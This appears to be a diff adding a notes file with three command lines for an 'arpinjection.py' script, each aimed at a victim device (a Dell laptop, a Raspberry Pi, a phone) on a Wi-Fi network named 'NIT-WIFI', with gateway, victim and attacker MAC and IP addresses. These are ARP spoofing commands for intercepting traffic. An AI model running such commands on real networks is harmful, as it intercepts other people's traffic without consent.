@@ -1,0 +1,8 @@
+NITWIFI victim dell attacker tplink
+./arpinjection.py wlp0s29u1u2mon 70:E4:22:C0:1A:01 1 10.10.48.1 00:71:cc:06:68:2d 10.10.49.41 18:A6:F7:14:25:D9
+
+NIT-WIFI victim rpi attacker tplink
+./arpinjection.py wlp0s29u1u2mon 70:E4:22:C0:1A:01 1 10.10.48.1 b8:27:eb:c1:b6:6f  10.10.49.83 18:A6:F7:14:25:D9
+
+NIT-WIFI victim mobile attacker tplink
+./arpinjection.py wlp0s29u1u2mon 70:E4:22:C0:1A:01 1 10.10.48.1 20:82:c0:5e:2f:5e  10.10.48.139 18:A6:F7:14:25:D9
